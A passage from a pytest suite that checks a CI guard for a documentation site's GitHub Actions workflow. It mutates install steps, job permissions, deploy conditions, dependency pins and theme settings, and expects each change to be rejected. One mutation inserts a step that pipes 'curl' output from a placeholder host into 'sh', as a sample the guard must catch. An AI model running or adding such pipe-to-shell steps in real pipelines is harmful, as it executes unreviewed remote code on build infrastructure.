    "workflow concurrency changed": (_set(lambda wf: wf["concurrency"], "cancel-in-progress", True), "workflow concurrency changed"),
    # --- structural checker reference (R3) ---
    "structural check compares the site against itself": (
        _replace_in("check_docs_site.py", '--reference "$RUNNER_TEMP/material-reference"', "--reference site"),
        "compares the site against itself",
    ),
    "structural check against another directory": (
        _replace_in("check_docs_site.py", "material-reference", "something-else"),
        "reference must be the Material reference build output",
    ),
    "structural check without a reference": (_replace_in("check_docs_site.py", ' --reference "$RUNNER_TEMP/material-reference"', ""), "must pass --site and --reference"),
    # --- Zensical installation / upgrade (R3) ---
    "extra Zensical upgrade step": (_insert_after("pip install", {"name": "up", "run": "python -m pip install -U zensical"}), "unexpected installation or upgrade command"),
    "unpinned Zensical installed after the pinned install": (_insert_after("pip install", {"name": "z", "run": "python -m pip install zensical"}), "unexpected installation or upgrade command"),
    "upgrade flag added to the pinned install": (_replace_in("pip install", "pip install", "pip install --upgrade"), "unexpected installation or upgrade command"),
    "Zensical installed from another requirements file": (_replace_in("pip install", "docs/requirements-zensical.txt", "docs/requirements-other.txt"), "unexpected installation or upgrade command"),
    "uv pip Zensical install": (_insert_after("pip install", {"name": "u", "run": "uv pip install zensical --upgrade"}), "unexpected installation or upgrade command"),
    "pipx Zensical install": (_insert_after("pip install", {"name": "u", "run": "pipx install zensical"}), "unexpected Zensical command"),
    "unaudited command added": (_insert_after("pip install", {"name": "x", "run": "curl -s https://example.invalid | sh"}), "failure masking or command chaining"),
    # --- permissions (R3) ---
    "build job gains pages permission": (_set(lambda wf: _build(wf)["permissions"], "pages", "write"), "build job permissions"),
    "build job gains id-token permission": (_set(lambda wf: _build(wf)["permissions"], "id-token", "write"), "build job permissions"),
    "workflow permissions widened": (_set(lambda wf: wf["permissions"], "contents", "write"), "workflow-level permissions"),
    "deploy permissions broadened": (_set(_deploy, "permissions", {"contents": "write", "pages": "write", "id-token": "write"}), "deploy permissions broadened"),
    "deploy gains packages permission": (_set(_deploy, "permissions", {**WORKFLOW_PERMISSIONS, "packages": "write"}), "deploy permissions broadened"),
    # --- deployment gating (R4) ---
    "deploy no longer needs build": (_set(_deploy, "needs", ["build", "other"]), "deploy must need exactly"),
    "deploy dependency removed": (_set(_deploy, "needs", _DELETE), "deploy must need exactly"),
    "deploy runs on pull requests": (_set(_deploy, "if", "github.event_name == 'pull_request'"), "deploy condition changed"),
    "deploy not gated on DOCS_PUBLISH": (_set(_deploy, "if", "github.event_name == 'push' && github.ref == 'refs/heads/main'"), "deploy condition changed"),
    "deploy allowed for tag pushes (previous condition)": (_set(_deploy, "if", "github.event_name == 'push' && vars.DOCS_PUBLISH == 'true'"), "deploy condition changed"),
    "deploy ref check loosened to startsWith": (_set(_deploy, "if", "github.event_name == 'push' && startsWith(github.ref, 'refs/heads/') && vars.DOCS_PUBLISH == 'true'"), "deploy condition changed"),
    "deploy forced by always()": (_set(_deploy, "if", f"always() && {DEPLOY_IF}"), "deploy condition changed"),
    "deploy condition removed": (_set(_deploy, "if", _DELETE), "deploy condition changed"),
    "deploy continue-on-error": (_set(_deploy, "continue-on-error", True), "continue-on-error on deploy"),
    "deploy gains a second step": (lambda wf: _deploy(wf)["steps"].append({"run": "echo extra"}), "deploy must consist of the single"),
}


@pytest.mark.parametrize("name", list(MUTATIONS))
def test_guard_detects_regression(name):
    mutate, expected = MUTATIONS[name]
    broken = copy.deepcopy(load())
    mutate(broken)
    problems = workflow_violations(broken)
    assert any(expected in p for p in problems), problems


def test_every_mutation_really_changes_the_workflow():
    original = load()
    for name, (mutate, _expected) in MUTATIONS.items():
        broken = copy.deepcopy(original)
        mutate(broken)
        assert broken != original, name


def test_every_deploy_condition_variant_fails_the_truth_table_somewhere():
    """The loosened conditions the guard rejects really are less safe."""
    original = load()["jobs"]["deploy"]["if"]
    tag = ("push", "refs/tags/v0.1.0", "true")
    assert _evaluate(original, *tag) is False
    assert _evaluate("github.event_name == 'push' && vars.DOCS_PUBLISH == 'true'", *tag) is True
    assert _evaluate("github.event_name == 'push' && github.ref == 'refs/heads/main'", "push", "refs/heads/main", None) is True


# --- pins and the Classic variant (R3) ---------------------------------------------

CONFIG_MUTATIONS: dict[str, tuple[Callable[[dict], None], str]] = {
    "Zensical pin bumped": (lambda f: f.update({"requirements-zensical.txt": "zensical==0.0.74\n"}), "production builder pin changed"),
    "Zensical pin loosened": (lambda f: f.update({"requirements-zensical.txt": "zensical>=0.0.73\n"}), "production builder pin changed"),
    "Zensical pin removed": (lambda f: f.update({"requirements-zensical.txt": "# nothing\n"}), "production builder pin changed"),
    "second requirement added to the Zensical file": (lambda f: f.update({"requirements-zensical.txt": "zensical==0.0.73\nmkdocs-material\n"}), "production builder pin changed"),
    "Playwright unpinned": (lambda f: f.update({"requirements-docs-browser.txt": "playwright>=1.64\n"}), "browser test pin changed"),
    "Playwright removed": (lambda f: f.update({"requirements-docs-browser.txt": "\n"}), "browser test pin changed"),
    "Material reference requirement changed": (lambda f: f.update({"requirements-docs.txt": "mkdocs-material>=10\n"}), "Material reference/rollback requirement changed"),
    "Classic variant removed": (lambda f: f.update({"mkdocs.yml": f["mkdocs.yml"].replace("  variant: classic\n", "")}), "theme.variant must be classic"),
    "Modern variant selected": (lambda f: f.update({"mkdocs.yml": f["mkdocs.yml"].replace("variant: classic", "variant: modern")}), "theme.variant must be classic"),
    "offline plugin enabled": (lambda f: f.update({"mkdocs.yml": f["mkdocs.yml"] + "\nplugins:\n  - offline\n"}), "offline plugin must not be enabled"),
    "directory URLs disabled": (lambda f: f.update({"mkdocs.yml": f["mkdocs.yml"] + "\nuse_directory_urls: false\n"}), "use_directory_urls must stay"),
}


@pytest.mark.parametrize("name", list(CONFIG_MUTATIONS))
def test_pin_guard_detects_regression(name):
    mutate, expected = CONFIG_MUTATIONS[name]
    files = dict(_config_files())
    mutate(files)
    assert files != _config_files(), name
    problems = config_violations(files)
    assert any(expected in p for p in problems), problems


def test_workflow_installs_exactly_the_pinned_requirement_files():
    steps = load()["jobs"]["build"]["steps"]
    install = next(_cmd(s) for s in steps if "pip install" in _cmd(s))
    assert install == INSTALL
    for name in ("requirements-zensical.txt", "requirements-docs.txt", "requirements-docs-browser.txt"):
        assert (ROOT / "docs" / name).is_file()


# --- failing closed on a missing browser --------------------------------------------


def _load_search_module():
    spec = importlib.util.spec_from_file_location("check_docs_search", ROOT / "scripts" / "check_docs_search.py")
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def test_missing_playwright_fails_the_gate(monkeypatch, tmp_path, capsys):
    search = _load_search_module()
    (tmp_path / "index.html").write_text("x", "utf-8")
    monkeypatch.setitem(sys.modules, "playwright", None)
    monkeypatch.setitem(sys.modules, "playwright.sync_api", None)
    monkeypatch.setattr("sys.argv", ["check_docs_search.py", "--site", str(tmp_path)])
    assert search.main() == 2
    assert "playwright is not installed" in capsys.readouterr().err


def test_missing_chromium_fails_the_gate(monkeypatch, tmp_path, capsys):
    pytest.importorskip("playwright.sync_api")
    search = _load_search_module()
    (tmp_path / "index.html").write_text("x", "utf-8")
    (tmp_path / "search.json").write_text('{"items": [1]}', "utf-8")
    monkeypatch.setenv("PLAYWRIGHT_BROWSERS_PATH", str(tmp_path / "no-browsers"))
    monkeypatch.setattr("sys.argv", ["check_docs_search.py", "--site", str(tmp_path)])
    assert search.main() == 2
    assert "Chromium cannot be launched" in capsys.readouterr().err
